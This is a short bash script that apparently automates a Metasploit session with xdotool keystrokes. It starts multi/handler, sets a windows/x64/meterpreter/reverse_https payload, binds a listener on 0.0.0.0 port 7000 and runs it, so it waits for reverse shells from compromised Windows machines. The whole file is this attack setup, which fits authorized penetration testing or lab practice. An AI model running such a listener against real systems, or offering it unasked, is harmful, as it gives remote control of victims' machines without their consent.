#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

paste_command "use multi/handler"
xdotool key Return

paste_command "set payload windows/x64/meterpreter/reverse_https"
xdotool key Return

paste_command "set lhost 0.0.0.0"
xdotool key Return

paste_command "set lport 7000"
xdotool key Return

paste_command "run"
xdotool key Return

